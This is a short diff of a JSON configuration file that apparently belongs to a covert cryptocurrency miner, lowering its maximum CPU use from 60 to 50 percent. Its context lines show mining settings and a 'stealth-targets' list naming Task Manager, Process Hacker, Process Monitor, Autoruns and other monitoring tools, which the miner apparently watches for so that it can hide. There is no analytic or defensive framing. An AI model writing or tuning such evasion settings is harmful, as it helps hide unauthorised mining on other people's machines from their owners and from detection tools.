@@ -6,7 +6,7 @@
     "password": "new",
     "nicehash": true,
     "ssltls": true,
-    "max-cpu": 60,
+    "max-cpu": 50,
     "idle-wait": 2,
     "idle-cpu": 70,
     "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,resmon.exe,perfmon.exe,procexp.exe,procexp64.exe,Procmon.exe,Procmon64.exe,Procmon64a.exe,ProcessExplorer.exe,ProcessMonitor.exe,Autoruns.exe,ProcessLasso.exe,Depends.exe,HWMonitor.exe,SystemExplorer.exe,AnVirTaskManager.exe,ProcessActivityView.exe,ProcessHacker2.exe,AdvancedTaskManager.exe,ProcessMaster.exe,SecurityTaskManager.exe,WhatsRunning.exe,System Informer.exe",
